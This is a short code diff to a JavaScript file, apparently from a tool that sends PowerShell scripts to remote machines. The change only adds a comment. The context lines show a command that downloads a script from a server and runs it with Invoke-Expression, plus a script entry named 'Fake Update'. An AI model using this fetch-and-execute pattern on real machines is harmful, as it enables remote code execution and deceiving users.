@@ -16,6 +16,7 @@ const getScript = (name, param1 = "",param2="") => {
     return `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/${name}").Content) )`
 }
 
+// Prebuilt scripts to be displayed as buttons
 const scripts = [
     {
         name: 'Fake Update',
